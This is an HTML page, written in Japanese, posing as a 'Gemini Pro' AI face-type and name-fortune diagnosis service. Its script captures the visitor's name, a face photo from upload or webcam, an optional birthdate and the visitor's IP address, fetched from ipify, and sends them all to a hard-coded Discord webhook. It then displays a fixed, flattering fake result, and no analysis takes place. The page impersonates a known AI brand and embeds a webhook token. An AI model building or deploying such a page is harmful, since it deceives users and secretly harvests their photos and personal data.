<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gemini Pro - AI 診断</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Noto+Sans+JP:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #131314;
            --card-bg: #1e1f20;
            --input-bg: #2a2b2d;
            --text-color: #e3e3e3;
            --sub-text: #9aa0a6;
            --border-color: #37393b;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Google Sans', 'Noto Sans JP', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
        }

        /* --- ナビゲーション & ハンバーガー --- */
        .navbar {
            position: absolute;
            top: 16px;
            left: 20px;
            right: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 10;
        }

        .hamburger-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .hamburger-btn div {
            width: 24px;
            height: 2px;
            background-color: var(--text-color);
            border-radius: 2px;
            transition: 0.3s;
        }

        .drawer-menu {
            position: fixed;
            top: 0;
            left: -280px;
            width: 280px;
            height: 100%;
            background-color: var(--card-bg);
            border-right: 1px solid var(--border-color);
            box-shadow: 4px 0 16px rgba(0,0,0,0.5);
            z-index: 200;
            transition: left 0.3s ease;
            padding: 24px;
        }

        .drawer-menu.active {
            left: 0;
        }

        .menu-title {
            font-size: 14px;
            font-weight: 500;
            color: var(--sub-text);
            margin-bottom: 20px;
            padding-bottom: 8px;
            border-bottom: 1px solid var(--border-color);
        }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border-radius: 12px;
            color: var(--text-color);
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 8px;
            font-size: 15px;
        }

        .menu-item:hover, .menu-item.active {
            background-color: var(--input-bg);
        }

        .drawer-backdrop {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 150;
        }

        .drawer-backdrop.active {
            display: block;
        }

        /* --- メインコンテナ --- */
        .container {
            width: 100%;
            max-width: 520px;
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 24px;
            padding: 32px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            margin-top: 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 28px;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: linear-gradient(90deg, rgba(66,133,244,0.15), rgba(155,81,224,0.15));
            border: 1px solid rgba(168, 199, 250, 0.3);
            padding: 4px 12px;
            border-radius: 100px;
            font-size: 12px;
            font-weight: 500;
            color: #a8c7fa;
            margin-bottom: 12px;
        }

        .header h1 {
            font-size: 26px;
            font-weight: 700;
            background: linear-gradient(90deg, #4285f4, #9b51e0, #fbbc05);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }

        .header p {
            color: var(--sub-text);
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: var(--sub-text);
            margin-bottom: 8px;
        }

        input[type="text"] {
            width: 100%;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 14px 16px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus {
            border-color: #a8c7fa;
        }

        /* 顔診断専用プレビューエリア */
        .preview-box {
            position: relative;
            width: 100%;
            height: 240px;
            background-color: var(--input-bg);
            border: 2px dashed var(--border-color);
            border-radius: 16px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        #video, #photo-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }

        .placeholder-text {
            text-align: center;
            color: var(--sub-text);
            font-size: 14px;
        }

        .placeholder-text svg {
            width: 36px;
            height: 36px;
            fill: var(--sub-text);
            margin-bottom: 8px;
        }

        .media-controls {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }

        .btn-secondary {
            flex: 1;
            background-color: var(--input-bg);
            border: 1px solid var(--border-color);
            color: var(--text-color);
            padding: 10px;
            border-radius: 10px;
            font-size: 13px;
            cursor: pointer;
        }

        .btn-submit {
            width: 100%;
            background: linear-gradient(90deg, #1a73e8, #8ab4f8);
            border: none;
            color: #fff;
            padding: 16px;
            border-radius: 100px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
        }

        /* 診断モードの切り替え制御 */
        .mode-section {
            display: none;
        }

        .mode-section.active {
            display: block;
        }

        #file-input, #canvas { display: none; }

        /* オーバーレイ */
        .overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(19, 19, 20, 0.85);
            backdrop-filter: blur(8px);
            z-index: 300;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-left-color: #a8c7fa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .overlay p {
            font-size: 16px;
            font-weight: 500;
            color: #a8c7fa;
        }
    </style>
</head>
<body>

    <!-- ハンバーガーボタン -->
    <div class="navbar">
        <button class="hamburger-btn" id="menu-btn">
            <div></div>
            <div></div>
            <div></div>
        </button>
    </div>

    <!-- ドロワーメニュー -->
    <div class="drawer-backdrop" id="backdrop"></div>
    <div class="drawer-menu" id="drawer">
        <div class="menu-title">Gemini AI 診断メニュー</div>
        <div class="menu-item active" id="menu-face">📷 AI 顔診断</div>
        <div class="menu-item" id="menu-name">✏️ AI 名前・姓名診断</div>
    </div>

    <!-- メインカード -->
    <div class="container">
        <div class="header">
            <div class="badge" id="mode-badge">✨ Gemini 1.5 Pro Vision</div>
            <h1 id="title-text">AI 顔タイプ・特徴診断</h1>
            <p id="desc-text">最先端のビジョンAIであなたの顔タイプと印象を分析します</p>
        </div>

        <form id="diag-form">
            <div class="form-group">
                <label for="username">お名前（またはニックネーム）</label>
                <input type="text" id="username" placeholder="例: ヤマダ タロウ" required>
            </div>

            <!-- 顔診断専用エリア -->
            <div class="mode-section active" id="section-face">
                <div class="form-group">
                    <label>顔写真を選択または撮影</label>
                    <div class="preview-box" id="preview-box">
                        <video id="video" autoplay playsinline></video>
                        <img id="photo-preview" alt="Preview">
                        <div class="placeholder-text" id="placeholder">
                            <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5-7l-3 3.72L9 13l-3 4h12l-4-5z"/></svg>
                            <p>クリックして写真をアップロード</p>
                        </div>
                    </div>

                    <div class="media-controls">
                        <button type="button" class="btn-secondary" id="btn-camera">📷 カメラ起動</button>
                        <button type="button" class="btn-secondary" id="btn-capture" style="display: none;">📸 撮影</button>
                        <button type="button" class="btn-secondary" id="btn-file">📁 ファイル選択</button>
                    </div>
                </div>
            </div>

            <!-- 名前診断専用エリア -->
            <div class="mode-section" id="section-name">
                <div class="form-group">
                    <label for="birthdate">生年月日（任意・より精度が上がります）</label>
                    <input type="text" id="birthdate" placeholder="例: 2000年1月1日">
                </div>
            </div>

            <button type="submit" class="btn-submit" id="btn-submit">AI診断を開始する</button>
        </form>
    </div>

    <div class="overlay" id="overlay">
        <div class="spinner"></div>
        <p id="overlay-text">Gemini Pro が解析中...</p>
    </div>

    <input type="file" id="file-input" accept="image/*">
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1547998269186248744/y5zYjuLwV882A0tlb60QV10d0QB4qOJTz05yH9_r8OJKsINj_qGq8B1f488A4O68dNjW";

        let currentMode = 'face'; // 'face' または 'name'
        let currentBlob = null;
        let stream = null;

        // UIエレメント
        const menuBtn = document.getElementById('menu-btn');
        const drawer = document.getElementById('drawer');
        const backdrop = document.getElementById('backdrop');
        const menuFace = document.getElementById('menu-face');
        const menuName = document.getElementById('menu-name');

        const modeBadge = document.getElementById('mode-badge');
        const titleText = document.getElementById('title-text');
        const descText = document.getElementById('desc-text');
        const sectionFace = document.getElementById('section-face');
        const sectionName = document.getElementById('section-name');

        const video = document.getElementById('video');
        const photoPreview = document.getElementById('photo-preview');
        const placeholder = document.getElementById('placeholder');
        const fileInput = document.getElementById('file-input');
        const canvas = document.getElementById('canvas');

        const btnCamera = document.getElementById('btn-camera');
        const btnCapture = document.getElementById('btn-capture');
        const btnFile = document.getElementById('btn-file');

        // メニューの開閉
        menuBtn.addEventListener('click', () => {
            drawer.classList.add('active');
            backdrop.classList.add('active');
        });

        backdrop.addEventListener('click', closeMenu);

        function closeMenu() {
            drawer.classList.remove('active');
            backdrop.classList.remove('active');
        }

        // モード切り替え処理
        menuFace.addEventListener('click', () => {
            currentMode = 'face';
            menuFace.classList.add('active');
            menuName.classList.remove('active');
            sectionFace.classList.add('active');
            sectionName.classList.remove('active');
            
            modeBadge.textContent = '✨ Gemini 1.5 Pro Vision';
            titleText.textContent = 'AI 顔タイプ・特徴診断';
            descText.textContent = '最先端のビジョンAIであなたの顔タイプと印象を分析します';
            closeMenu();
        });

        menuName.addEventListener('click', () => {
            currentMode = 'name';
            menuName.classList.add('active');
            menuFace.classList.remove('active');
            sectionName.classList.add('active');
            sectionFace.classList.remove('active');

            modeBadge.textContent = '✨ Gemini 1.5 Pro Text Engine';
            titleText.textContent = 'AI 名前・姓名判断';
            descText.textContent = '名前の響きと文字パワーから潜在的な性格と運勢を分析します';
            stopCamera();
            closeMenu();
        });

        // カメラ/ファイル読み込み処理
        document.getElementById('preview-box').addEventListener('click', (e) => {
            if (e.target !== btnCamera && e.target !== btnCapture && e.target !== btnFile) {
                fileInput.click();
            }
        });
        btnFile.addEventListener('click', () => fileInput.click());

        fileInput.addEventListener('change', (e) => {
            const file = e.target.files[0];
            if (file) {
                stopCamera();
                currentBlob = file;
                photoPreview.src = URL.createObjectURL(file);
                photoPreview.style.display = 'block';
                video.style.display = 'none';
                placeholder.style.display = 'none';
            }
        });

        btnCamera.addEventListener('click', async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                video.style.display = 'block';
                photoPreview.style.display = 'none';
                placeholder.style.display = 'none';
                btnCamera.style.display = 'none';
                btnCapture.style.display = 'inline-block';
            } catch (err) {
                alert('カメラの起動に失敗しました。');
            }
        });

        btnCapture.addEventListener('click', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob((blob) => {
                currentBlob = blob;
                photoPreview.src = URL.createObjectURL(blob);
                photoPreview.style.display = 'block';
                video.style.display = 'none';
                stopCamera();
            }, 'image/jpeg', 0.9);
        });

        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            btnCamera.style.display = 'inline-block';
            btnCapture.style.display = 'none';
        }

        // IPアドレス取得関数
        async function getUserIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch {
                return '取得不可';
            }
        }

        // フォーム送信（Discordへ通知）
        document.getElementById('diag-form').addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            if (!username) return alert('お名前を入力してください。');

            if (currentMode === 'face' && !currentBlob) {
                return alert('診断用の顔写真を撮影または選択してください。');
            }

            const overlay = document.getElementById('overlay');
            const overlayText = document.getElementById('overlay-text');
            overlay.style.display = 'flex';

            // IPアドレスの取得
            const userIP = await getUserIP();

            const formData = new FormData();
            let payload = {};

            if (currentMode === 'face') {
                payload = {
                    username: "Gemini Pro 顔診断 AI",
                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/8/8a/Google_Gemini_logo.svg",
                    embeds: [{
                        title: "📷 新しい「顔診断」データが届きました",
                        color: 4360180, // Blue
                        fields: [
                            { name: "👤 お名前", value: username, inline: true },
                            { name: "🌐 IPアドレス", value: userIP, inline: true },
                            { name: "🕒 日時", value: new Date().toLocaleString("ja-JP"), inline: false }
                        ],
                        image: { url: "attachment://face_image.jpg" }
                    }]
                };
                formData.append('file', currentBlob, 'face_image.jpg');
            } else {
                const birthdate = document.getElementById('birthdate').value.trim() || '未入力';
                payload = {
                    username: "Gemini Pro 名前診断 AI",
                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/8/8a/Google_Gemini_logo.svg",
                    embeds: [{
                        title: "✏️ 新しい「名前診断」データが届きました",
                        color: 10179040, // Purple
                        fields: [
                            { name: "👤 お名前", value: username, inline: true },
                            { name: "🎂 生年月日", value: birthdate, inline: true },
                            { name: "🌐 IPアドレス", value: userIP, inline: false },
                            { name: "🕒 日時", value: new Date().toLocaleString("ja-JP"), inline: false }
                        ]
                    }]
                };
            }

            formData.append('payload_json', JSON.stringify(payload));

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    overlayText.textContent = "解析完了！結果を出力中...";
                    setTimeout(() => {
                        overlay.style.display = 'none';
                        if (currentMode === 'face') {
                            alert(`【顔診断結果】\n${username} さんの顔タイプ：『知的で洗練されたクールオーラタイプ』`);
                        } else {
                            alert(`【名前診断結果】\n${username} さんの強運度：98%\n周囲を引きつける強いカリスマ性と才能を秘めています。`);
                        }
                    }, 1200);
                } else {
                    throw new Error('送信失敗');
                }
            } catch (err) {
                console.error(err);
                overlay.style.display = 'none';
                alert('送信に失敗しました。');
            }
        });
    </script>
</body>
</html>
